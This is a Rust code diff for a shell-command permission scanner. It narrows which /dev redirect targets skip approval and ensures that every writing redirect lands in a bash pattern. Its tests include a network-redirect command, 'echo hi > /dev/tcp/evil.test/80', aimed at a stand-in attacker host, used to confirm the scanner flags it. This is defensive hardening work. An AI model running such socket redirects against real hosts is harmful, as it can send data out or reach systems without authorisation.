@@ -500,6 +500,23 @@ pub async fn collect(
     scan
 }
 
+/// Redirect targets that are plain sinks or the process's own streams. Only
+/// these are exempt from `external_directory`; the rest of `/dev` is not
+/// (`/dev/tcp/host/port` opens a socket in bash, `/dev/shm` is real storage).
+fn is_sink(path: &Path) -> bool {
+    const SINKS: &[&str] = &[
+        "/dev/null",
+        "/dev/stdin",
+        "/dev/stdout",
+        "/dev/stderr",
+        "/dev/tty",
+    ];
+    SINKS.iter().any(|sink| path == Path::new(sink))
+        || path.strip_prefix("/dev/fd").is_ok_and(|fd| {
+            fd.to_string_lossy().bytes().all(|b| b.is_ascii_digit()) && fd != Path::new("")
+        })
+}
+
 /// Fold file redirections into the scan. `collect` only looks at command
 /// parts, so without this `> /etc/x` would never reach `external_directory`,
 /// and a statement with no command (`> file`) would skip the `bash`
@@ -514,12 +531,14 @@ pub async fn collect_redirects(
 ) {
     for redirect in redirects {
         if let Some(resolved) = arg_path(&redirect.target, cwd, ps, shell) {
-            // `/dev/null` and friends are sinks, not files worth a prompt.
-            if !resolved.starts_with("/dev") && !contains_path(&resolved, instance) {
+            if !is_sink(&resolved) && !contains_path(&resolved, instance) {
                 scan.push_dir(dirname(&resolved).display().to_string());
             }
         }
-        if redirect.writes && redirect.standalone && !scan.patterns.contains(&redirect.source) {
+        // Whatever the statement's shape (`> f`, `cd x > f`, `{ …; } > f`,
+        // `a | b > f`), a write must appear in some `bash` pattern. Commands
+        // whose own pattern is the redirected statement already cover it.
+        if redirect.writes && !scan.patterns.contains(&redirect.source) {
             scan.push_pattern(redirect.source.clone());
             scan.push_always(redirect.source.clone());
         }
@@ -1463,9 +1482,39 @@ mod tests {
         let scan = redirect_scan("make > /dev/null 2>&1", &dir);
         assert!(scan.dirs.is_empty(), "{scan:?}");
         assert_eq!(scan.patterns, vec!["make > /dev/null 2>&1".to_string()]);
-        let scan = redirect_scan("ls | grep x > out.txt", &dir);
+        let scan = redirect_scan("exec 3> /dev/fd/3", &dir);
         assert!(scan.dirs.is_empty(), "{scan:?}");
-        assert_eq!(scan.patterns.len(), 2, "{scan:?}");
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[tokio::test(flavor = "multi_thread")]
+    async fn other_dev_paths_are_external() {
+        let dir = temp("redirect-dev");
+        let scan = redirect_scan("echo hi > /dev/tcp/evil.test/80", &dir);
+        assert_eq!(scan.dirs, vec!["/dev/tcp/evil.test".to_string()]);
+        let scan = redirect_scan("echo hi > /dev/shm/x", &dir);
+        assert_eq!(scan.dirs, vec!["/dev/shm".to_string()]);
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[tokio::test(flavor = "multi_thread")]
+    async fn every_writing_redirect_is_in_a_bash_pattern() {
+        let dir = temp("redirect-shapes");
+        for command in [
+            "ls | grep x > out.txt",
+            "{ cd sub; } > out.txt",
+            "(cd sub) > out.txt",
+            "> out.txt cd sub",
+            "while false; do cd sub; done > out.txt",
+        ] {
+            let scan = redirect_scan(command, &dir);
+            assert!(
+                scan.patterns
+                    .iter()
+                    .any(|pattern| pattern.contains("out.txt")),
+                "{command}: {scan:?}"
+            );
+        }
         std::fs::remove_dir_all(&dir).ok();
     }
 
